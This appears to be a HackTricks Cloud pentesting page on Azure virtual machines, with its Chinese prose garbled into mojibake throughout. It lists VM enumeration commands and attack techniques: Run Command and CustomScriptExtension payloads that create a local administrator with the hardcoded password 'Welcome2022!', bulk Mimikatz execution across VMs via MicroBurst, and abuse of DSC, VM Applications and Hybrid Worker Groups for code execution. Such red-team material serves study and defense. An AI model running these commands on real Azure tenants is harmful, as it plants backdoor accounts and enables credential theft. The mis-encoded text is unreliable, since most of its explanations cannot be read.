# Az - è™šæ‹Ÿæœº & ç½‘ç»œ

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Azureè™šæ‹Ÿæœºæ˜¯Azureæä¾›çš„å‡ ç§ç±»å‹çš„[æŒ‰éœ€ï¼Œå¯æ‰©å±•è®¡ç®—èµ„æº](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)ä¹‹ä¸€ã€‚é€šå¸¸ï¼Œå½“æ‚¨éœ€è¦æ¯”å…¶ä»–é€‰æ‹©æä¾›çš„æ›´å¤šæ§åˆ¶è®¡ç®—ç¯å¢ƒæ—¶ï¼Œæ‚¨ä¼šé€‰æ‹©è™šæ‹Ÿæœºã€‚æœ¬æ–‡ä¸ºæ‚¨æä¾›äº†åœ¨åˆ›å»ºè™šæ‹Ÿæœºä¹‹å‰åº”è€ƒè™‘çš„ä¿¡æ¯ï¼Œå¦‚ä½•åˆ›å»ºå®ƒï¼Œä»¥åŠå¦‚ä½•ç®¡ç†å®ƒã€‚

## Azureç½‘ç»œä¿¡æ¯

Azureç½‘ç»œåŒ…å«**ä¸åŒçš„å®ä½“å’Œé…ç½®æ–¹å¼ã€‚** æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹å†…å®¹ä¸­æ‰¾åˆ°ä¸åŒAzureç½‘ç»œå®ä½“çš„**ç®€è¦æè¿°ï¼Œ** **ç¤ºä¾‹** å’Œ **æšä¸¾**å‘½ä»¤ï¼š

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** æ˜¯ä¸€ä¸ªå®Œå…¨æ‰˜ç®¡çš„æœåŠ¡ï¼Œå®ƒæä¾›**å®‰å…¨ä¸”æ— ç¼çš„RDP**ï¼ˆè¿œç¨‹æ¡Œé¢åè®®ï¼‰å’Œ**SSH**ï¼ˆå®‰å…¨å¤–å£³ï¼‰**è®¿é—®**ï¼Œç›´æ¥åœ¨Azureé—¨æˆ·ä¸­é€šè¿‡SSLè®¿é—®æ‚¨çš„**è™šæ‹Ÿæœº**ã€‚è¿™é¡¹æœåŠ¡æ˜¯å°†æ‚¨çš„è™šæ‹Ÿæœºæš´éœ²ç»™å…¬å…±äº’è”ç½‘è¿æ¥çš„æ›´å®‰å…¨ã€æ›´ä¾¿æ·çš„**æ›¿ä»£æ–¹æ¡ˆ**ã€‚Azure Bastionåœ¨æ‚¨çš„Azureè™šæ‹Ÿç½‘ç»œå†…é…ç½®ï¼Œä¸ºVNetä¸­çš„æ‰€æœ‰VMæä¾›RDPå’ŒSSHè¿æ¥ï¼Œä½¿ç”¨ç§æœ‰IPåœ°å€ï¼Œè¿™æ„å‘³ç€æ‚¨ä¸éœ€è¦ä¸ºAzure VMåˆ†é…å…¬å…±IPåœ°å€ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨çš„å…¬å¸åœ¨Azure VNetå†…æ‰˜ç®¡äº†å‡ ä¸ªç”¨äºå¼€å‘å’Œæµ‹è¯•çš„VMã€‚**è€Œä¸æ˜¯è®¾ç½®å…¬å…±IPåœ°å€å’Œç®¡ç†æ¯ä¸ªVMçš„NSGè§„åˆ™**ä»¥å¯ç”¨RDPæˆ–SSHè®¿é—®ï¼Œæ‚¨**éƒ¨ç½²Azure Bastion**ã€‚æœ‰äº†Azure Bastionï¼Œæ‚¨çš„å¼€å‘äººå‘˜å’ŒITäººå‘˜å¯ä»¥**å®‰å…¨åœ°ä½¿ç”¨ä»–ä»¬çš„ç½‘ç»œæµè§ˆå™¨ä»Azureé—¨æˆ·è®¿é—®è¿™äº›VM**ï¼Œæ— éœ€å…¬å…±IPåœ°å€ã€‚

è¦åˆ—å‡ºæ‚¨è®¢é˜…ä¸­çš„æ‰€æœ‰Azure Bastionä¸»æœºï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
## VM æšä¸¾
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œå‘½ä»¤**

### **VMä¸­çš„AADç™»å½•**

å¯ä»¥å…è®¸é€šè¿‡AzureADè®¤è¯çš„ç”¨æˆ·è®¿é—®ã€‚ä¾‹å¦‚ï¼Œå°è¯•è®¿é—®ä¸€ä¸ª**linux VM**ï¼š`ssh username@azure-corp.com@1.1.1.1`ï¼ˆä½¿ç”¨ç™»å½•æ—¶ç”¨çš„azurecorpçš„**ç”µå­é‚®ä»¶**å¾ˆé‡è¦ï¼‰ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹é”™è¯¯ï¼š

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

åªéœ€**æŒ‰ç…§è¿™äº›æŒ‡ç¤º**è®¿é—® [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) å¹¶è¾“å…¥ä»£ç ï¼Œä½¿ç”¨ç”µå­é‚®ä»¶å’Œå¯†ç ä½œä¸ºå‡­è¯ï¼Œæ‚¨å°†èƒ½å¤Ÿé€šè¿‡ SSH è¿æ¥ï¼ˆå¦‚æœè¯¥ç”¨æˆ·æœ‰è¶³å¤Ÿçš„æƒé™ï¼š`Virtual Machine Administrator Login` æˆ– `Virtual Machine User Login` è§’è‰²ï¼‰ã€‚

### **è¿è¡Œå‘½ä»¤**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **è¿è¡Œè‡ªå®šä¹‰è„šæœ¬æ‰©å±•**

Azure è™šæ‹Ÿæœºï¼ˆVMï¼‰æ‰©å±•æ˜¯**å°å‹åº”ç”¨ç¨‹åº**ï¼Œå®ƒä»¬åœ¨**Azure VMs**ä¸Šæä¾›éƒ¨ç½²åçš„é…ç½®å’Œè‡ªåŠ¨åŒ–**ä»»åŠ¡**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè™šæ‹Ÿæœºéœ€è¦å®‰è£…è½¯ä»¶ã€é˜²ç—…æ¯’ä¿æŠ¤ï¼Œæˆ–è€…éœ€è¦åœ¨å…¶å†…éƒ¨è¿è¡Œè„šæœ¬ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ VM æ‰©å±•ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰å†™å…¥æƒé™ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼š
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)** ç±»ä¼¼äº Ansibleï¼Œä½†å®ƒæ˜¯ PowerShell å†…çš„ä¸€ä¸ªå·¥å…·ï¼Œå…è®¸é€šè¿‡ä»£ç è®¾ç½®ä¸»æœºã€‚DSC åœ¨ Azure ä¸­æœ‰è‡ªå·±çš„æ‰©å±•ï¼Œå…è®¸ä¸Šä¼ **é…ç½®æ–‡ä»¶**ã€‚DSC [é…ç½®æ–‡ä»¶](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document) åœ¨è¯­æ³•ä¸Šéå¸¸æŒ‘å‰”ï¼Œç„¶è€Œ DSC æ‰©å±•éå¸¸è½»ä¿¡ï¼Œåªè¦éµå¾ªä¸€å®šçš„æ ¼å¼ï¼Œå®ƒä¼š**ç›²ç›®æ‰§è¡Œä»»ä½•å‘½ä»¤**ï¼Œå¦‚å›¾ 5 æ‰€ç¤ºã€‚

<figure><img src="../../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

è¿™å¯ä»¥é€šè¿‡ **Az PowerShell** å‡½æ•° [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) æ¥å®Œæˆã€‚DSC æ‰©å±•éœ€è¦ä¸€ä¸ªå¸¦æœ‰**å‡½æ•°**çš„ **.PS1** æ–‡ä»¶ï¼Œå¹¶æ‰“åŒ…åœ¨ **.zip** æ–‡ä»¶ä¸­ã€‚ç”±äºè¿™å®é™…ä¸Šä¸æ˜¯æ­£ç¡®çš„ DSC è¯­æ³•ï¼Œæ‰©å±•çŠ¶æ€å°†æ˜¾ç¤ºä¸ºâ€œå¤±è´¥â€ï¼Œä½†ä»£ç å°†è¢«æ‰§è¡Œã€‚è¿™æ ·åšçš„é—®é¢˜æ˜¯æ²¡æœ‰å‘½ä»¤çš„è¾“å‡ºï¼Œå› ä¸ºçŠ¶æ€è¢«å¤±è´¥æ¶ˆæ¯è¦†ç›–äº†ã€‚

### VM Application Definitions

[VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) èµ„æºæ˜¯ä¸€ç§å‘ Azure VM **é‡å¤éƒ¨ç½²ç‰ˆæœ¬åŒ–åº”ç”¨ç¨‹åº**çš„æ–¹å¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨åˆ›å»ºä¸€ä¸ª**ç¨‹åº**å¹¶å°†å…¶ä½œä¸ºç‰ˆæœ¬ 1.0 **éƒ¨ç½²**åˆ°æ‰€æœ‰ Azure VMï¼Œä¸€æ—¦å°†ç¨‹åº**æ›´æ–°åˆ° 1.1**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„ VM Application **åˆ›å»ºå¦ä¸€ä¸ªå®šä¹‰**å¹¶å°†æ›´æ–°æ¨é€åˆ°ä»»ä½• VMã€‚\
èƒ½å¤Ÿ**æ¨é€åº”ç”¨ç¨‹åº**åˆ° VM æ„å‘³ç€å®ƒæ˜¯å¦ä¸€ç§**ä»£ç æ‰§è¡Œ**çš„é€”å¾„ã€‚è¿™ç§æ–¹æ³•çš„ç¼ºç‚¹æ˜¯è®¾ç½®åº”ç”¨ç¨‹åºå®šä¹‰[**éœ€è¦ä¸€äº›æ­¥éª¤**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal)ï¼Œä½†å¯ä»¥ä½¿ç”¨ Az PowerShell ä¸­çš„ **`New-AzGalleryApplication`** å’Œ **`New-AzGalleryApplicationVersion`** cmdlets æ¥å®Œæˆã€‚

è¿™é¡¹æŠ€æœ¯é€šè¿‡ä½¿ç”¨ä¸€ä¸ª**æ‰©å±•â€œVMAppExtensionâ€**å·¥ä½œï¼Œå½“å°†åº”ç”¨ç¨‹åºåº”ç”¨åˆ° VM æ—¶ï¼Œè¯¥æ‰©å±•ä¼šè‡ªåŠ¨å®‰è£…ã€‚æ‰©å±•å°†æ–‡ä»¶ä» URI ä¸‹è½½åˆ°ç£ç›˜ä¸Šï¼Œåç§°ä¸åº”ç”¨ç¨‹åºåç§°_å®Œå…¨ç›¸åŒ_ï¼Œè¿™æ„å‘³ç€å¦‚æœåº”ç”¨ç¨‹åºåç§°æ˜¯â€˜AzApplicationâ€™ï¼Œç£ç›˜ä¸Šçš„æ–‡ä»¶ä¹Ÿå«åšâ€˜AzApplicationâ€™ï¼Œæ²¡æœ‰æ‰©å±•åã€‚è¿™è¦æ±‚åœ¨ [REST API è°ƒç”¨](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update) ä¸­é…ç½®â€œManageActionsâ€å­—æ®µï¼Œä»¥ä¾¿ç”¨é€‚å½“çš„æ‰©å±•åé‡å‘½ååº”ç”¨ç¨‹åºã€‚å¦‚æœæ‚¨ä¸æƒ³è¿è¡Œæ•´ä¸ªåº”ç”¨ç¨‹åºï¼Œå¯ä»¥é€šè¿‡æ»¥ç”¨åŒä¸€ REST API æ–¹æ³•ä¸­çš„ ManageActions å­—æ®µæˆ–é€šè¿‡ Azure Portal æ¥è¿è¡Œä»»æ„ PowerShell å‘½ä»¤ã€‚ä¸€æ—¦è®¾ç½®å¥½ï¼Œå®šä¹‰å°†ç±»ä¼¼äºå›¾ 8ã€‚

<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

ä¸å¹¸çš„æ˜¯ï¼Œè¿™ç§æ‰§è¡ŒæŠ€æœ¯é€Ÿåº¦è¾ƒæ…¢ï¼ˆæ‰§è¡Œåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤å¤§çº¦éœ€è¦ 3-4 åˆ†é’Ÿï¼‰ï¼Œä½†ç”±äºå®ƒç›¸å¯¹è¾ƒæ–°ï¼Œæˆ‘ä¼šæ„Ÿåˆ°æƒŠè®¶å¦‚æœæœ‰ä»»ä½•ç‰¹å®šçš„æ£€æµ‹è¢«ç¼–å†™ã€‚

ç”±äºæœ€ç»ˆæ˜¯æ‰©å±•æ‰§è¡Œäº†æ“ä½œï¼Œåº”ç”¨ç¨‹åºçš„å‰¯æœ¬ä½äº `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`ï¼Œæ‰§è¡Œçš„çŠ¶æ€ä¿ç•™åœ¨ `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`ã€‚

### Hybrid Worker Groups

[**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) (HWGs) å…è®¸åœ¨è‡ªåŠ¨åŒ–å¸æˆ·ä¸­é…ç½®çš„**Runbook**åœ¨ä½œä¸º**é…ç½® HWG**çš„ä¸€éƒ¨åˆ†çš„**Azure è™šæ‹Ÿæœº**ä¸Š**è¿è¡Œ**ã€‚åŒæ ·ï¼Œ**æ‰©å±•è¢«ç”¨äº**åœ¨ VM ä¸Šéƒ¨ç½² Runbook ä»£ç ã€‚ç”±äºä½¿ç”¨äº†æ‰©å±•ï¼Œå‡­æ®æ— å…³ç´§è¦ï¼Œä»£ç ä½œä¸º**SYSTEM**æˆ– root æ‰§è¡Œã€‚

<figure><img src="../../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

å¦‚æœä½¿ç”¨ Windows 10 VMï¼Œé‡è¦çš„æ˜¯è®© Runbook ä½œä¸º PowerShell ç‰ˆæœ¬ 5.1 è€Œä¸æ˜¯ 7.1 è¿è¡Œï¼Œå› ä¸º 7.1 é»˜è®¤ä¸å®‰è£…åœ¨ VM ä¸Šï¼Œè„šæœ¬å°†æ— æ³•è¿è¡Œã€‚

## å‚è€ƒèµ„æ–™

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF** ç‰ˆæœ¬ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
